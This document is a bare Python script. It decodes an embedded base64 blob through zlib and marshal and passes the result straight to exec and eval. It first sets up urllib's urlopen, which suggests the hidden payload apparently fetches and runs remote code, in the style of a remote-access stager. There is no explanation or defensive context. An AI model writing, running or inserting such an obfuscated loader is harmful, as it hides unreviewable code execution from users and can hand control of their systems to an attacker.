import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrdWZgYCgtyskvSM3TUM8oKSmw0tc3tDTSMzSz0DPQMzQwsbIwsDDU10/OyUzNKynWLy5JTE8tKtbPBqopqFTX1CtKTUzR0AQA5k8U+Q==')))))